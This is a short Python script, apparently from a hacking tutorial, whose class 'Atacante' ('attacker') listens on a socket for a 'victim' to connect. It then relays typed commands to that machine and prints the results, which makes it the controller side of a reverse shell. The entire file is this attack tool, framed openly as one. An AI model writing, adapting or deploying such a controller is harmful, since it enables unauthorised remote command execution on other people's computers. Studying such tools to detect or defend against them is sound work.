#-*-coding: utf-8-*-
from socket import *

# https://www.youtube.com/watch?v=4eAMSmWG_lM&t=385s

class Atacante():
	def __init__(self):
		self.server = socket(AF_INET, SOCK_STREAM)
		self.host = str(input("Introduce tu ip (privada): "))
		self.port = int(input("Introduce el puerto: "))

	def main(self):
		self.server.bind((self.host, self.port))
		self.server.listen(1)
		print("[info] Esperando establecer conexión...")
		while True:
			victima, direccion = self.server.accept()
			print("Se ha establecido una conexión: {}".format(direccion))
			break
		self.cmd(victima)
	def cmd(self, victima):
		while True:
			try:
				cmd = input(">>")
				victima.send(cmd)
				print(victima.recv(4096))
			except:
				exit()
if __name__ == '__main__':
	atk = Atacante()
	atk.main()
